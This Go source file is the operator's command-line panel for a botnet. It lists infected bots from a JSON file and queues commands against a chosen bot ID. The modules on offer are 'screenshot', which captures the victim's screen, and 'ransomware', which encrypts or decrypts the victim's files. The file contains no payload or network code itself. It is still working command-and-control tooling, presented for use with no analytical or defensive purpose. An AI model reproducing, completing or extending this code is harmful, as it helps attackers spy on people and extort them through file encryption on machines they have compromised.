package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
)

type bot struct {
	Id       string `json:"bot_id"`
	Status   string `json:"status"`
	Lastseen string `json:"lastseen"`
	Command  string `json:"command"`
}

func getBots() (bots []bot) {
	fileBytes, err := ioutil.ReadFile("./bots.json")

	if err != nil {
		panic(err)
	}

	err = json.Unmarshal(fileBytes, &bots)

	if err != nil {
		panic(err)
	}

	return bots
}

func saveBots(bots []bot) {

	botBytes, err := json.Marshal(bots)
	if err != nil {
		panic(err)
	}

	err = ioutil.WriteFile("./bots.json", botBytes, 0666)
	if err != nil {
		panic(err)
	}
}

func main() {
	showCmd := flag.NewFlagSet("show", flag.ExitOnError)
	showBots := showCmd.Bool("bots", false, "Show all bots")
	showMods := showCmd.Bool("mods", false, "Show all modules")

	sendCmd := flag.NewFlagSet("send", flag.ExitOnError)
	sendID := sendCmd.String("id", "", "Target ID")
	sendModule := sendCmd.String("module", "", "Module to be used")
	sendOption := sendCmd.String("option", "", "Option for module")

	switch os.Args[1] {
	case "show":
		handleShow(showCmd, showBots, showMods)
	case "send":
		handleSend(sendCmd, sendID, sendModule, sendOption)
	default:
		fmt.Println("Command not supported")
		os.Exit(1)
	}
}

func handleShow(showCmd *flag.FlagSet, bots *bool, mods *bool) {

	showCmd.Parse(os.Args[2:])

	if *bots == false && *mods == false {
		fmt.Printf("--bots or --mods is required\n")
		showCmd.PrintDefaults()
		os.Exit(1)
	}

	if *bots {
		//display bots
		bots := getBots()
		fmt.Printf("Bot ID \t Bot Status \t Last Seen\n")
		for i, _ := range bots {
			_, err := fmt.Printf("%s, %s,", bots[i].Id, bots[i].Status)
			if err != nil {
				return
			}
			fmt.Println(" ", bots[i].Lastseen)
		}
	}
	if *mods {
		fmt.Println("1. 'screenshot' - capture screenshot of target bot")
		fmt.Println("2. 'ransomware' - encrypt files on target bot")
	}
}

func handleSend(sendCmd *flag.FlagSet, id *string, module *string, option *string) {
	sendCmd.Parse(os.Args[2:])

	if *id == "" || *module == "" {
		fmt.Printf("Both id and module are required\n")
		sendCmd.PrintDefaults()
		os.Exit(1)
	}

	if *module != "screenshot" && *module != "ransomware" {
		fmt.Println("Module not supported")
		os.Exit(1)
	}

	if *module == "ransomware" && *option == "" {
		fmt.Println("encrypt or decrypt option needed")
		os.Exit(1)
	}
	bots := getBots()

	for i, _ := range bots {
		if bots[i].Id == *id {
			if *module == "ransomware" {
				newstr := *module + " " + *option
				bots[i].Command = newstr
			} else {
				bots[i].Command = *module
			}
		}
	}
	saveBots(bots)
}
